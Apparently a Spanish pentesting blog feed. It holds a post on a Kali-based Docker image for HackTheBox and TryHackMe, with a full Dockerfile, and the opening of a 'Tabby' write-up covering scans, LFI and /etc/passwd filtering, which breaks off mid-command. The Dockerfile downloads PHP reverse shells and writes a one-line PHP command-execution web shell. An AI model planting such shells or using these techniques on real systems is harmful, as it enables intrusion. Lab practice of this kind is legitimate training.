        <content type="html"><![CDATA[<h1><a href="#hackeando-con-docker" class="header-anchor">#</a><span id="hackeando-con-docker">Hackeando con docker</span></h1><h2><a href="#introduccion" class="header-anchor">#</a><span id="introduccion">Introducción</span></h2><p>En este post principalmente voy a mostrar mi configuraciones de docker, la mayoría son sacadas de Docker Hub ya que considero que están muy bien hechas y si nos podemos ahorrar trabajo mucho mejor. Pero si que voy hablar de la docker que he creado para mi, para poder hacer los retos de HackTheBox, TryHackMe, Atenea,…<br>Primero voy a empezar explicando donde utilizo la docker, ya que si alguien le interesa puedo compartir como tengo hecha mi distribución. Así que, si únicamente te interesa como tengo mi docker recomiendo que saltes la primera parte. </p><h3><a href="#mi-distribucion" class="header-anchor">#</a><span id="mi-distribucion">Mi distribución</span></h3><p>Personalmente soy una persona que siempre me gustado Linux, así que era muy habitual para mi ir cambiando de distribuciones, me gustaba ver y entender porque eran distintas.<br>Al final he visto que algunas están mas enfocadas en sus respectivos temas, pero no quiero enfocar ese post en compararlas.<br>Primero me gustaría compartir un poco mi experiencia con las distribuciones dedicadas al pentesting.<br>Des de hace un par de años descubrí el mundo de la ciberseguridad me podría gustar, así que empecé a buscar en google como empezar y en todos los sitios me aparecía que tenia que usar Kali Linux, estoy seguro que sabes cual es. Después cuando sabia un poco más me pase a BlackArch ya que había estado con Majaro anteriormente y entendía como funcionaba la distribución de Arch. Y desde hace 1 año he estado trabajando con Parrot OS, personalmente es la que más me ha gustado y más cómodo he podido trabajar. Pero tener un único ordenador y dedicarlo el Pentesting sin verlo, se me llenaba de cosas que solo utilizaba una única vez y a veces solamente lo tenia porque creía que me ayudaría en un CTF. Por suerte soy una persona muy organizada y me gusta tenerlo todo en su sitio, aun así tenia el ordenador lleno. Mi única solución era virtualizar pero mi pc no es suficiente bueno como para tener el host y otra maquina virtualizada corriendo, y que no se congele o le pase algo que no pudiera trabajar cómodamente.<br>Así que al final me decidir hacer un cambio de nuevo. Actualmente estoy trabajando con Arch Linux, configurado con el entorno de bspwm. Mi intención no era tener de nuevo un host pentesting, pero si buscaba algo muy ligero y que menos que Arch linux.<br>Ahora la pregunta seria y, ¿Y como lo hago para dedicarme al pentest?<br>Y aquí el nombre del título. Recientemente aprendí a usar docker y me gusto mucho su funcionamiento así que decidir aprender mas y eso también ha sido uno de los motivos que he ha hecho cambiar de distribución.</p><p>Para quién no conozca docker, aquí os dejo una pequeña idea sacado de la Wikipedia.</p><blockquote><p>Docker es un proyecto de código abierto que automatiza el despliegue de aplicaciones dentro de contenedores de software, proporcionando una capa adicional de abstracción y automatización de virtualización de aplicaciones en múltiples sistemas operativos.​ Docker utiliza características de aislamiento de recursos del kernel Linux, tales como cgroups y espacios de nombres (namespaces) para permitir que “contenedores” independientes se ejecuten dentro de una sola instancia de Linux, evitando la sobrecarga de iniciar y mantener máquinas virtuales.</p></blockquote><p>Y si aun no sabés que és aqui te comparto unos enlaces la web oficial donde puedes encontrar que és un contenedor y aprofundir más.<br><a href="https://www.docker.com/resources/what-container" target="_blank" rel="noopener">https://www.docker.com/resources/what-container</a></p><h1><a href="#mi-configuracion-de-docker" class="header-anchor">#</a><span id="mi-configuracion-de-docker">Mi configuración de docker</span></h1><p>Ahora ya sabiendo un poco de mis problemas con los recursos de mi ordenador empezemos como tengo configurado mi docker.<br>Actualmente tengo varias imagenes pero algunas son temporales. Asi que me voy a centrar con las que más utilizo.</p><p><img src="https://i.imgur.com/Dgmsl9p.png" alt></p><p>Como se puede apreciar una és la kali linux la core y la de bugbounty és inspirada con <a href="https://hub.docker.com/r/hackersploit/bugbountytoolkit" target="_blank" rel="noopener">hackersploit/bugbountytoolkit</a>.<br>Como he dicho la primera tiene referencia a la kali linux core, donde no hay nada instalado. Así que decidí montarlo a mi gusto.<br>Para crear un contenidor docker a tu gusto simplemente necessitas saber como funciona el archivo <code>Dockerfile</code>. </p><p>Poco a poco iré añadiendo herramientas nuevas que vaya viendo a lo largo del tiempo, pero actualmente mi docker cuenta con:</p><h4><a href="#tools" class="header-anchor">#</a><span id="tools">Tools</span></h4><ul><li><input checked disabled type="checkbox"> tmux </li><li><input checked disabled type="checkbox"> nmap</li><li><input checked disabled type="checkbox"> nikto</li><li><input checked disabled type="checkbox"> zsh</li><li><input checked disabled type="checkbox"> dnsutil</li><li><input checked disabled type="checkbox"> sqlmap</li><li><input checked disabled type="checkbox"> wfuzz</li><li><input checked disabled type="checkbox"> ffuf</li><li><input checked disabled type="checkbox"> wpscan</li><li><input checked disabled type="checkbox"> dnsrecon</li><li><input checked disabled type="checkbox"> cracmapexe</li><li><input checked disabled type="checkbox"> netcat</li><li><input checked disabled type="checkbox"> dirsearch</li><li><input checked disabled type="checkbox"> whatweb</li><li><input checked disabled type="checkbox"> r2frida</li><li><input checked disabled type="checkbox"> evil-winrm</li><li><input checked disabled type="checkbox"> dnsenum </li></ul><h4><a href="#wordlist" class="header-anchor">#</a><span id="wordlist">Wordlist</span></h4><ul><li><input checked disabled type="checkbox"> SecList</li></ul><h4><a href="#scripts" class="header-anchor">#</a><span id="scripts">Scripts</span></h4><ul><li><input checked disabled type="checkbox"> enum4linux</li><li><input checked disabled type="checkbox"> LinEnum</li><li><input checked disabled type="checkbox"> pspy64</li></ul><h4><a href="#web-shells" class="header-anchor">#</a><span id="web-shells">Web shells</span></h4><ul><li><input checked disabled type="checkbox"> simple-backdoor.php</li><li><input checked disabled type="checkbox"> php-reverse-shell</li><li><input checked disabled type="checkbox"> simple-php-shell</li></ul><p>Esta es mi imagen y a partir de aquí creo los contenedores, y voy borrando y creando nuevos en función de lo que necesite. Así siempre esta organizado y cuando acabo tomo mis apuntes y elimino el contenido.</p><p>El contenido de mi Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> kalilinux/kali-rolling</span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> maintainer=<span class="string">"Jack21"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> HOME /root</span><br><span class="line"><span class="keyword">ENV</span> DEBIAN_FRONTEND=noninteractive</span><br><span class="line"></span><br><span class="line"><span class="comment">#Working Directory</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /root</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir <span class="variable">$&#123;HOME&#125;</span>/toolkit &amp;&amp; \</span></span><br><span class="line"><span class="bash">    mkdir /work &amp;&amp; \</span></span><br><span class="line"><span class="bash">    mkdir <span class="variable">$&#123;HOME&#125;</span>/wordlists &amp;&amp; \</span></span><br><span class="line"><span class="bash">    mkdir -p <span class="variable">$&#123;HOME&#125;</span>/scripts/Enumeration &amp;&amp; \ </span></span><br><span class="line">    mkdir $&#123;HOME&#125;/scripts/PrivEsc &amp;&amp; \ </span><br><span class="line">    mkdir $&#123;HOME&#125;/scripts/Web</span><br><span class="line"></span><br><span class="line"><span class="comment"># Install Essentials</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apt-get install -y --no-install-recommends \</span></span><br><span class="line"><span class="bash">    build-essential \</span></span><br><span class="line"><span class="bash">    tmux \</span></span><br><span class="line"><span class="bash">    gcc \</span></span><br><span class="line"><span class="bash">    iputils-ping\</span></span><br><span class="line"><span class="bash">    git \</span></span><br><span class="line"><span class="bash">    vim \</span></span><br><span class="line"><span class="bash">    wget \</span></span><br><span class="line"><span class="bash">    awscli \</span></span><br><span class="line"><span class="bash">    tzdata \</span></span><br><span class="line"><span class="bash">    curl \</span></span><br><span class="line"><span class="bash">    make \</span></span><br><span class="line"><span class="bash">    nmap \</span></span><br><span class="line"><span class="bash">    whois \</span></span><br><span class="line"><span class="bash">    python \</span></span><br><span class="line"><span class="bash">    python-pip \</span></span><br><span class="line"><span class="bash">    python3 \</span></span><br><span class="line"><span class="bash">    python3-pip \</span></span><br><span class="line"><span class="bash">    perl \</span></span><br><span class="line"><span class="bash">    nikto \</span></span><br><span class="line"><span class="bash">    dnsutils \</span></span><br><span class="line"><span class="bash">    net-tools \</span></span><br><span class="line"><span class="bash">    neovim\</span></span><br><span class="line"><span class="bash">    zsh\</span></span><br><span class="line"><span class="bash">    nano\</span></span><br><span class="line"><span class="bash">    libzip-dev \ </span></span><br><span class="line">    nodejs \</span><br><span class="line">    npm \</span><br><span class="line">    pkg-config \</span><br><span class="line">    openssh-client \</span><br><span class="line">    rlwrap \</span><br><span class="line">    &amp;&amp; rm -rf /var/lib/apt/lists/*</span><br><span class="line"></span><br><span class="line"><span class="comment">#Install Dependencies </span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apt-get install -y --no-install-recommends \</span></span><br><span class="line"><span class="bash">    <span class="comment"># sqlmap</span></span></span><br><span class="line">    sqlmap \</span><br><span class="line">    <span class="comment"># dnsenum</span></span><br><span class="line">    cpanminus \</span><br><span class="line">    <span class="comment"># wpcscan</span></span><br><span class="line">    libcurl4-openssl-dev \</span><br><span class="line">    libxml2 \</span><br><span class="line">    libxml2-dev \</span><br><span class="line">    libxslt1-dev \</span><br><span class="line">    ruby-dev \</span><br><span class="line">    libgmp-dev \</span><br><span class="line">    zlib1g-dev \</span><br><span class="line">    <span class="comment"># dnsrecon</span></span><br><span class="line">    dnsrecon \</span><br><span class="line">    <span class="comment">#crackmapexe</span></span><br><span class="line">    libssl-dev \</span><br><span class="line">    libffi-dev\</span><br><span class="line">    python-dev \ </span><br><span class="line">    build-essential \</span><br><span class="line">    <span class="comment">#netcat</span></span><br><span class="line">    netcat \</span><br><span class="line">    <span class="comment">#enum4linux </span></span><br><span class="line">    enum4linux \</span><br><span class="line">    <span class="comment">#dnsenum</span></span><br><span class="line">    dnsenum \</span><br><span class="line">    <span class="comment">#hashcat</span></span><br><span class="line">    hashcat \</span><br><span class="line">    <span class="comment">#JohnTheRipper</span></span><br><span class="line">    john \</span><br><span class="line">    <span class="comment"># hash-identifier</span></span><br><span class="line">    hash-identifier \</span><br><span class="line">    <span class="comment"># hydra</span></span><br><span class="line">    hydra \</span><br><span class="line">    <span class="comment">#tcpdump </span></span><br><span class="line">    tcpdump \ </span><br><span class="line">    <span class="comment">#openvpn</span></span><br><span class="line">    openvpn \</span><br><span class="line">    &amp;&amp; rm -rf /var/lib/apt/lists/*</span><br><span class="line"></span><br><span class="line"><span class="comment"># configure python(s)</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> python -m pip install --upgrade setuptools &amp;&amp; python3 -m pip install --upgrade setuptools &amp;&amp; python3 -m pip install --upgrade setuptools</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># wpscan</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">cd</span> <span class="variable">$&#123;HOME&#125;</span>/toolkit &amp;&amp; \</span></span><br><span class="line"><span class="bash">    git <span class="built_in">clone</span> https://github.com/wpscanteam/wpscan.git &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">cd</span> wpscan/ &amp;&amp; \</span></span><br><span class="line"><span class="bash">    gem install bundler &amp;&amp; bundle install --without <span class="built_in">test</span> &amp;&amp; \</span></span><br><span class="line"><span class="bash">    gem install wpscan</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># go</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">cd</span> /opt &amp;&amp; \</span></span><br><span class="line"><span class="bash">    wget https://dl.google.com/go/go1.13.3.linux-amd64.tar.gz &amp;&amp; \</span></span><br><span class="line"><span class="bash">    tar -xvf go1.13.3.linux-amd64.tar.gz &amp;&amp; \</span></span><br><span class="line"><span class="bash">    rm -rf /opt/go1.13.3.linux-amd64.tar.gz &amp;&amp; \</span></span><br><span class="line"><span class="bash">    mv go /usr/<span class="built_in">local</span> </span></span><br><span class="line"><span class="keyword">ENV</span> GOROOT /usr/local/go</span><br><span class="line"><span class="keyword">ENV</span> GOPATH /root/go</span><br><span class="line"><span class="keyword">ENV</span> PATH $&#123;GOPATH&#125;/bin:$&#123;GOROOT&#125;/bin:$&#123;PATH&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># dirsearch</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">cd</span> <span class="variable">$&#123;HOME&#125;</span>/toolkit &amp;&amp; \</span></span><br><span class="line"><span class="bash">    git <span class="built_in">clone</span> https://github.com/AlexisAhmed/dirsearch.git &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">cd</span> dirsearch &amp;&amp; \</span></span><br><span class="line"><span class="bash">    chmod +x dirsearch.py &amp;&amp; \</span></span><br><span class="line"><span class="bash">    ln -sf <span class="variable">$&#123;HOME&#125;</span>/toolkit/dirsearch/dirsearch.py /usr/<span class="built_in">local</span>/bin/dirsearch</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ffuf </span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> go get github.com/ffuf/ffuf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># zsh </span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> config/zsh/.oh-my-zsh/themes/oxide.zsh-theme <span class="variable">$&#123;HOME&#125;</span>/.zshrc</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chsh -s /bin/zsh &amp;&amp; \</span></span><br><span class="line"><span class="bash">    git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="string">"<span class="variable">$HOME</span>/.zsh-syntax-highlighting"</span> --depth 1 &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">echo</span> <span class="string">"source <span class="variable">$HOME</span>/.zsh-syntax-highlighting/zsh-syntax-highlighting.zsh"</span> &gt;&gt; <span class="string">"<span class="variable">$HOME</span>/.zshrc"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># whatweb</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">cd</span> <span class="variable">$&#123;HOME&#125;</span>/toolkit &amp;&amp; \</span></span><br><span class="line"><span class="bash">    git <span class="built_in">clone</span> https://github.com/urbanadventurer/WhatWeb.git &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">cd</span> WhatWeb &amp;&amp; \</span></span><br><span class="line"><span class="bash">    chmod +x whatweb &amp;&amp; \</span></span><br><span class="line"><span class="bash">    ln -sf <span class="variable">$&#123;HOME&#125;</span>/toolkit/WhatWeb/whatweb /usr/<span class="built_in">local</span>/bin/whatweb</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Crackmapexe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> git <span class="built_in">clone</span> --recursive https://github.com/byt3bl33d3r/CrackMapExec &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">cd</span> CrackMapExec &amp;&amp; \</span></span><br><span class="line"><span class="bash">    python3 setup.py install</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r2frida</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/radareorg/radare2.git /opt/radare2 &amp;&amp; \ </span></span><br><span class="line">    cd /opt/radare2 &amp;&amp; \</span><br><span class="line">    sys/install.sh &amp;&amp; \</span><br><span class="line">    r2pm init &amp;&amp; \ </span><br><span class="line">    r2pm -ci r2frida</span><br><span class="line">    </span><br><span class="line"><span class="comment">#evil-winrm</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> gem install evil-winrm</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># JohnTheRipper</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/magnumripper/JohnTheRipper.git <span class="string">"<span class="variable">$&#123;HOME&#125;</span>/toolkit/JohnTheRipper"</span></span></span><br><span class="line"><span class="keyword">ENV</span> PATH $&#123;HOME&#125;/toolkit/JohnTheRipper/<span class="keyword">run</span><span class="bash">:<span class="variable">$&#123;PATH&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Download wordlist</span></span><br><span class="line"><span class="comment"># SecList</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">cd</span> <span class="variable">$&#123;HOME&#125;</span>/wordlists &amp;&amp; \</span></span><br><span class="line"><span class="bash">    git <span class="built_in">clone</span> --depth 1 https://github.com/danielmiessler/SecLists.git &amp;&amp; \</span></span><br><span class="line"><span class="bash">    tar -zxvf  SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Donwload scripts </span></span><br><span class="line"><span class="comment"># LinEnum</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o <span class="variable">$&#123;HOME&#125;</span>/scripts/Enumeration/LinEnum.sh &amp;&amp; \</span></span><br><span class="line"><span class="bash">    rm LinEnum.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pspy64 - big</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> config/scripts/pspy64 <span class="variable">$&#123;HOME&#125;</span>/scripts/Enumeration/pspy64</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># php-reverse-shell</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -o scripts/Web/php-reverse-shell.php &amp;&amp; \</span></span><br><span class="line"><span class="bash">    rm php-reverse-shell.php</span></span><br><span class="line"><span class="comment"># simple-php-shell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> wget https://raw.githubusercontent.com/artyuum/Simple-PHP-Web-Shell/master/index.php -o scripts/Web/simple-webshell.php &amp;&amp; \</span></span><br><span class="line"><span class="bash">    rm index.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Simple Backdoor </span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">'&lt;?php system($_GET['</span>cmd<span class="string">']); ?&gt;'</span> &gt; scripts/Web/basic-shell.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add alias</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> -n <span class="string">"\n\n#Alias\n"</span> &gt;&gt; .zshrc &amp;&amp; \</span></span><br><span class="line"><span class="bash"><span class="built_in">echo</span> <span class="string">'alias ls="lsd"'</span> &gt;&gt; .zshrc &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">echo</span> <span class="string">'alias ll="ls -l"'</span> &gt;&gt; .zshrc &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">echo</span> <span class="string">'alias la="ls -a"'</span> &gt;&gt; .zshrc &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">echo</span> <span class="string">'alias lla="ls -la"'</span> &gt;&gt; .zshrc &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">echo</span> <span class="string">'alias cme="cracmapexe"'</span> &gt;&gt; .zshrc</span></span><br></pre></td></tr></table></figure><p>Lo comparto por aqui porque aun no és descargable ya que solamente funciona en mi pc, de momento o si eliminas los copy.<br>Decir que mi archivo <code>.zshrc</code> lo tengo personalizado ya que me gusta ver el nombre de la maquina, donde lo estoy haciendo(HTB,THM,..), su ip y mi ip de la vpn. El thema es oxide.zsh-theme. Las linias que he añadido para lograr el siguiente resultado:</p><p><img src="https://i.imgur.com/0zgniIi.png" alt></p><p>Lineas añadidas </p><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [[ $(ifconfig tun0 2&gt; /dev/null ) ]]; <span class="keyword">then</span></span><br><span class="line">    VPN=$(<span class="built_in">echo</span> -e <span class="string">" [ <span class="variable">$(ifconfig tun0 | grep inet | head -1 | awk '&#123;print $2&#125;')</span> ] "</span>)</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    VPN=<span class="string">""</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>Y el prompt se ha quedado asi</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PROMPT=$<span class="string">'\n%&#123;$oxide_orange%&#125; USER_NAME%&#123;$oxide_reset_color%&#125;@%&#123;$oxide_limegreen%&#125;DOMAIN_NAME %&#123;$oxide_reset_color%&#125;%&#123;$oxide_fuego%&#125; [ MACHINE_IP ] %&#123;$oxide_reset_color%&#125;%&#123;$oxide_turquoise%&#125; $&#123;VPN&#125; %&#123;$oxide_reset_color%&#125;%&#123;$oxide_limegreen%&#125;%~%&#123;$oxide_reset_color%&#125; $&#123;vcs_info_msg_0_&#125;\n%(?.%&#123;%F&#123;white&#125;%&#125;.%&#123;$oxide_red%&#125;)%(!.#.❯)%&#123;$oxide_reset_color%&#125; '</span></span><br></pre></td></tr></table></figure><p>A continuación hago el siguiente comando y ya tengo la imagen creada. </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker build -t marchortelano&#x2F;pentestkali -f- &#x2F;mnt&#x2F;docker &lt; Dockerfile</span><br></pre></td></tr></table></figure><p>Por acabar solo falta correr la imagen, como vemos aqui modificamos el prompt y le ponemos los datos que queremos. En la imagen anterior se puede apreciar que no coje el usuario de la maquina sino he modificado lo que quiero ver en mi prompt. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -ti --name HTB_<span class="variable">$name</span> --<span class="built_in">cap</span>-add=NET_ADMIN --device /dev/net/tun \       </span><br><span class="line">--sysctl net.ipv6.conf.all.disable_ipv6=0 \ </span><br><span class="line">-v /mnt/docker/kali/HTB_<span class="variable">$name</span>/work:/work \</span><br><span class="line">marchortelano/pentestkali bash -c <span class="string">"cp ~/.zshrc ~/.zshrc.temp; cat ~/.zshrc.temp | sed 's/USER_NAME/<span class="variable">$name</span>/g;s/DOMAIN_NAME/<span class="variable">$type</span>/g;s/MACHINE_IP/<span class="variable">$ip_machine</span>/g' &gt; ~/.zshrc; zsh"</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docker, Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tabby Writeup</title>
      <link href="/2020/06/29/Tabby/"/>
      <url>/2020/06/29/Tabby/</url>
      
        <content type="html"><![CDATA[<p>Nmap scan</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- --open -v -n tabby.htb</span><br></pre></td></tr></table></figure><blockquote><p>PORT     STATE SERVICE<strong>2</strong><br>22/tcp   open  ssh<br>80/tcp   open  http<br>8080/tcp open  http-proxy</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p22,80,8080 -sC -sV -o allPorts tabby.htb</span><br></pre></td></tr></table></figure><blockquote><p>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)<br>80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>|_http-title: Mega Hosting<br>8080/tcp open  http    Apache Tomcat<br>|_http-open-proxy: Proxy might be redirecting requests<br>|_http-title: Apache Tomcat</p></blockquote><h2><a href="#puerto-80" class="header-anchor">#</a><span id="puerto-80">Puerto 80</span></h2><h2><a href="#lfi" class="header-anchor">#</a><span id="lfi">LFI</span></h2><p>Vemos que en apartado de news es muy distinto a los otros del menu ya que en este te envia a un fichero que sellama statment, esto significa que hay alta probabilidad de LFI. </p><p><img src="https://i.imgur.com/89K4sdB.png" alt></p><p>Añadimos megahosting.htb en /etc/hosts para ver el contenido. Miramos con Burp y vemos que realmente se trata de un LFI. </p><p><img src="https://i.imgur.com/vc0fNsc.png" alt></p><p>Guardamos los usuarios como informacion importante asi que vamos a filtrar los que puedan loguearse, normalmente son los que acaban con /bin/bash peró eliminare los que no quiera asi el filtro sera mejor. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat etc-passwd | grep -v <span class="string">"nologin$\|false$\|sync$"</span></span><br></pre></td></tr></table></figure><blockquote><p>root:x:0:0:root:/root:/bin/bash<br>ash:x:1000:1000:clive:/home/ash:/bin/bash</p></blockquote><h2><a href="#puerto-8080" class="header-anchor">#</a><span id="puerto-8080">Puerto 8080</span></h2><p>Nos dirigimos a la pagina tomcat por el puerto 8080 y si leemos un poco vemos que hay dos cosas importantes, un fichero con users y hay distina informacion a tener en cuenta en este caso vemos que se trata de que el creador de la web és veterano y lo instala en CATALINA_HOME. </p><p><img src="https://i.imgur.com/p7GIRAJ.png" alt></p><p>Aun asi el directorio no es correcto asi que utilizamos la herrramienta ffuf para descubrirlo. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w 